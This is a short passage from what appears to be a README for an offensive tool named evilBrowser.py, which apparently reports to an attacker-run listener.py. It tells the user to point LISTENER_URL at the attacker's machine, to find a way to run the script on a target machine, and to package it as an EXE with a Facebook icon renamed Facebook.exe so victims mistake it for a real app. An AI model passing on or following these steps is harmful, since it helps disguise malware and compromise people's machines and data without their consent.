...
## How to use ?
1. Change `LISTENER_URL` in `evilBrowser.py` to the machine IP Address that runs the `listener.py`

2. Find a way to easily run the `evilBrowser.py` on target machine.
For a better result, build the script `evilBrowser.py` to an EXE file and add custom icon.
> For the example, run `build.bat` on a Windows machine to build an EXE with Facebook icon, then rename the file to *Facebook.exe*
